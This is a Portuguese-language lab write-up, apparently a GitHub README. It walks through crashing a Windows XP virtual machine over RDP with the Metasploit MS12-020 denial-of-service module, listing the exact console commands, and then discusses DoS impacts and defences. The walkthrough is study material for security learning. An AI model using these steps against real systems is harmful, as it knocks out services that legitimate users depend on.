     # Projeto-Ataque-DOS-

  <img width="1024" height="1024" alt="image" src="https://github.com/user-attachments/assets/24a37da0-fc88-41e9-bc37-2f3fa207347a" />

     
Simulação de Ataque DOS ao Windows XP

Simulação de ataque DOS (Via RDP: Remote Desktop Protocol) remoto no Windows XP com duas maquinas virtuais sendo elas: Kali Linux e WINDOWS XP, atraves de comandos pelo terminal do Kali.

Obs: os comandos e as ferramentas utilizadas nesse projeto são realizada afins de estudos e com ambientes seguro, não repita se não tiver o conhecimento e as ferramentas adequadas para aplicação.

               KALI LINuX

<img width="1909" height="1013" alt="image" src="https://github.com/user-attachments/assets/eb017d88-3616-4f74-abbf-246d4c3f223f" />

              WINDOWS XP

<img width="411" height="305" alt="image" src="https://github.com/user-attachments/assets/961b6053-1b9a-49d0-bbd1-59204839f8ea" />

Obs: ao entrar no prompt comando do windows: foi executado o seguinte comando: ipconfig e descoberto o ip da maquuina: 192.168.56.104
    
    1° Parte - Na maquina Kali Linux Iremos abrir o metasploit.

 Comando: msfconsole

<img width="280" height="302" alt="image" src="https://github.com/user-attachments/assets/80dd8274-b89c-46e2-8596-c295ca26950d" />
 
obs: Apos iniciar, o metasploit pode mudar a imagens inicial.

    2° Parte - No Kali iremos realizar a busca por RPD.

Comando: search rdp

<img width="809" height="420" alt="image" src="https://github.com/user-attachments/assets/e9dbd072-cdee-4a3e-8ac8-0d9e1f317b0a" />

Obs: Apos a busca, foi encontrado diversos comando exploit para a utilização, mas a que iremos utilizar para o projeto sera a que esta marcado em branco:

auxiliary/dos/windows/rdp/ms12_020_maxchannelids

    3° Parte: Executando o exploit - comando encontrado.

Comando: use auxiliary/dos/windows/rdp/ms12_020_maxchannelids

<img width="275" height="39" alt="image" src="https://github.com/user-attachments/assets/e317e91b-c507-4444-ba00-4f7613c06b66" />

    4° Parte: Ao entrar no exploit, iremos realizar o set dos host remote.

Comando: set rhosts (IP  alvo)

<img width="338" height="56" alt="image" src="https://github.com/user-attachments/assets/0845a4a3-08df-4177-8c8e-be47d3873c4d" />

    5° Parte (final) - apos o set no IP alvo, iremos executar o ataque.

Comando: run

https://github.com/user-attachments/assets/c6a3add9-50a9-4b22-ba09-0066dc275a68

Obs: Ao executar o ataque ao IP alvo, foi reiniciado a maquina, gerando um impacto a toda e qualquer atividade que estivesse sendo executado.

 🔑 Lições aprendidas com meu projeto

1. Conceitos de ataque DoS
Entendimento de como um Denial of Service (DoS) funciona: sobrecarregar um serviço (nesse caso, RDP) até que ele fique indisponível.

Diferença entre DoS e DDoS (ataque distribuído), já que foi simulado com uma única máquina atacante.

2. Exploração de vulnerabilidades do RDP
O protocolo RDP, especialmente em versões antigas como no Windows XP, possui falhas de segurança conhecidas.

Visto na prática como um serviço exposto sem proteção pode ser derrubado apenas com tráfego malicioso.

3. Uso do Kali Linux como ferramenta ofensiva
Aprende a utilizar comandos e ferramentas nativas do Kali (como hping3, nmap, ou scripts customizados) para gerar tráfego e explorar vulnerabilidades.

Enteimento de como  a importância de dominar o terminal para executar ataques simulados.

4. Configuração de ambiente seguro
Criar máquinas virtuais isoladas foi essencial para não causar danos reais à rede.

Isso reforça a prática de laboratórios controlados para estudar cibersegurança sem riscos.

5. Impacto prático do ataque
Observou como o Windows XP alvo ficou lento ou inacessível durante o ataque.

Isso mostra o efeito direto de um DoS: indisponibilidade de serviço e perda de produtividade.

6. Defesa e mitigação
Entendeu que sistemas antigos (como XP) são altamente vulneráveis e não devem ser usados em produção.

Percebeu a importância de medidas como:

Firewall para limitar tráfego suspeito.

Atualizações e patches (quando disponíveis).

Monitoramento de rede para detectar anomalias.

⚠️ Impactos de um ataque DoS
1. Indisponibilidade de serviços
O alvo (ex.: servidor RDP no Windows XP) fica inacessível para usuários legítimos.

Interrupção de atividades críticas, causando paralisação de operações.

2. Perda de produtividade
Funcionários ou sistemas que dependem do serviço não conseguem trabalhar.

Tempo perdido até que o serviço seja restaurado.

3. Prejuízos financeiros
Empresas podem perder receita por não conseguir atender clientes.

Custos adicionais com suporte técnico e recuperação.

4. Danos à reputação
Clientes e parceiros podem perder confiança na organização.

A imagem da empresa pode ser associada a falhas de segurança.

5. Risco de exploração secundária
Enquanto o sistema está sobrecarregado, invasores podem aproveitar para explorar outras vulnerabilidades.

Exemplo: usar o DoS como distração para um ataque mais sofisticado (exfiltração de dados).

6. Impacto em infraestrutura
Consumo excessivo de recursos (CPU, memória, largura de banda).

Possível degradação de outros serviços que compartilham a mesma rede ou servidor.

7. Consequências legais e regulatórias
Dependendo do setor, falhas de disponibilidade podem violar normas de compliance.

Empresas podem ser responsabilizadas por não proteger adequadamente seus sistemas.

📚 Conclusão
O ataque DoS não rouba dados diretamente, mas derruba serviços e abre brechas para problemas maiores. Por isso, é considerado uma ameaça séria tanto em ambientes corporativos quanto governamentais.


🛡️ Como se prevenir de ataques DoS
1. Atualizações e patches
Manter sistemas e serviços sempre atualizados.

Evitar uso de sistemas obsoletos (como Windows XP), que possuem falhas conhecidas e sem suporte.

2. Configuração de firewall e IDS/IPS
Usar firewalls para bloquear tráfego suspeito.

Implementar sistemas de detecção e prevenção de intrusão (IDS/IPS) para identificar padrões de ataque.

3. Limitação de conexões
Configurar limites de conexões simultâneas em serviços como RDP.

Reduzir tempo de sessão inativa para evitar sobrecarga.

4. Monitoramento constante
Utilizar ferramentas de monitoramento de rede para detectar picos anormais de tráfego.

Criar alertas automáticos para resposta rápida.

5. Redundância e balanceamento
Distribuir serviços em múltiplos servidores (load balancing).

Usar CDNs e infraestrutura distribuída para absorver tráfego excessivo.

6. Boas práticas de exposição
Evitar expor serviços críticos diretamente à internet.

Usar VPNs ou gateways seguros para acesso remoto.

📚 Resumo final
O que você aprendeu com seu projeto é que ataques DoS exploram fragilidades de disponibilidade. Para se prevenir, é essencial combinar tecnologia (firewalls, IDS, balanceamento) com boas práticas de administração (atualizações, monitoramento, restrição de acesso).



